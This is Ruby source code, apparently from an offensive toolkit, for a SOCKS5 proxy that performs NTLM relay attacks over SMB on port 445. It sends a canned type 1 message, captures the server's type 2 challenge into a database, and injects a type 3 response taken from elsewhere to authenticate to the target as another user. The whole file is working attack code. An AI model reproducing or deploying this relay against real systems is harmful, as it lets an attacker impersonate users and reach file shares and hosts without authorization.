#!/usr/bin/env ruby
#encoding: ASCII-8BIT
require 'zfmoduletest'
require 'zfntlm'
require 'zfclient'
require 'zfdb'
require 'timeout'
require 'base64'

module ZFsocks
  class Server
    def initialize (ipaddr,port)
      begin
        @servers = TCPServer.open(ipaddr, port)
        return @servers
      rescue Errno::EADDRINUSE, Errno::EACCES
        puts "SOCKS - PORT IN USE OR PERMS"
      return false
      end
    end

    def Consuccess(cli)
      status = 0
      rip1,rip2,rip3,rip4 = @ip
      port = 12345
      resp = [@version,status,0,1,rip1,rip2,rip3,rip4,port].pack("CCCCCCCCn")
      cli.write resp
    end

    def Confailed(cli)
      status = 5
      rip1,rip2,rip3,rip4 = @ip
      resp = [@version,status,0,1,rip1,rip2,rip3,rip4,0].pack("CCCCCCCCn")
      cli.write resp
      cli.close
    end

    def start()
      puts "Initializing SOCKS Client Proxy"
      zfdb = ZFdb::DB.new
      @version = 5
      loop {
        Thread.start(@servers.accept) do |cli|
          begin
          #TODO parse auth
            puts "NEW SOCKS CONNECTION [ " + cli.peeraddr[3] + " ]"
            q,x = cli.recvfrom(3000)
            cli.write([5,0].pack("CC"))
            q,x = cli.recvfrom(3000)
            vers,cmd,resvd,iptype = q.unpack("CCCC")
            if iptype != 1 then puts "NOT IPV4 WTF OMG LOL" end
            rip1,rip2,rip3,rip4 = q[4,4].unpack("CCCC")
            @ip = q[4,4].unpack("CCCC")
            ip = @ip.join(".")
            port = q[8,2].unpack("n")[0]
            if port.to_i==80 then
              puts "80s"
              
            elsif port.to_i==443 then
              puts "oh god, ssl proxy here we go"

            elsif port.to_i==445 then
              begin
                TCPSocket.open(ip,445) do |relay|
                  Consuccess(cli)
                  type2 = nil
                  threada= Thread.start {
                    loop {
                      begin
                        q, x = cli.recvfrom(5000)
                        if q.length == 0 then break end
                        req = ZFsmb::Client.new(q)
                        req.smbpid = "\xfe\xde"
                        if (req.smbcmd == "\x73") then # SetupAndX / SPNEGO TIME!
                          #puts "setupandx"
                           
                          ntlmreq = ZFsmb::Parsentlmfromspnego(req.bdata)
                          ntlmmsg = ZFNtlm::Message.new(ntlmreq)

                          if ntlmmsg.type == 1 then # if type 1 send type2
                            # TODO pull type1 from db (and well...store type1s)
                            oldtype1msgtemp = "\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                            type1msgtemp =    "\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x01\x02\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                            ZFsmb::Smbclientntlmnego(relay, 1, type1msgtemp, "\x00\x00")

                          elsif ntlmmsg.type == 3 then #if type 3 send OK
                            #puts q[32..33].unpack("H*")
                            ntlmmsg.parsetype3

                            #puts "SMB user: " + ntlmmsg.domain + "\\" + ntlmmsg.username
                            #puts "Passing type3"

                            reqid = zfdb.AddApiReq(ntlmmsg.username,ntlmmsg.domain,type2)
                            #puts "going to wait"
                            begin
                            type3msg = zfdb.WaitForApiResp(reqid,15)[0]
                            #puts type3msg.inspect
                            rescue
                              puts $!
                            end
                            type3msg = Base64.decode64(type3msg) #removed gsub TODO fix gsub\n
                            #puts "wait's over"
                            ZFsmb::Smbclientntlmnego(relay, 3, type3msg, q[32..33])
                            # TODO: Fix above to dynamic userid
                          else
                          relay.write(req.getpacket)
                          end
                        elsif (req.smbcmd == "\x75") then # TreeConnectAndX

                          #puts "treeconnectandx"
                          #TODO: update path!
                          #puts q[/(\x5c\x00\x5c\x00.*\x00\x00)/] # lazy detection of file share
                        relay.write(req.getpacket)
                        else
                          q[30..31] = "\xfe\xde"
                          #q[28..29] = "\x00\x00"
                          q[14..15] = "\x01\xc8"
                        relay.write(q)
                        end
                      rescue
                        puts $!
                        puts "broken"
                      end
                    }
                  }

                  loop {
                    begin
                      q2,x2 = relay.recvfrom(5000)
                      req2 = ZFsmb::Client.new(q2)
                      if (req2.smbcmd == "\x73") then # SetupAndX / SPNEGO TIME!
                        ntlmreq = ZFsmb::Parsentlmfromspnego(req2.bdata)

                        ntlmmsg = ZFNtlm::Message.new(ntlmreq)
                        if ntlmmsg.type == 2 then
                          type2 = Base64.encode64(ntlmreq) #TODO fix gsub issue. temp removed
                        end
                        #puts "relay in"
                      cli.write(q2)
                      else
                      cli.write(q2)
                      end
                    rescue
                      puts "woof"
                      puts $!
                      #puts "rescue"
                    threada.kill
                    break
                    end
                  }

                end
              rescue Errno::ENETUNREACH, Errno::EHOSTUNREACH
                Confailed(cli)

              rescue
                puts "other fail"
                puts $!.inspect
              end
            elsif port==139 then
              Confailed(cli)
            else
              puts "yar"
            end

          rescue
            puts $! end
        end
      }
    end
  end

end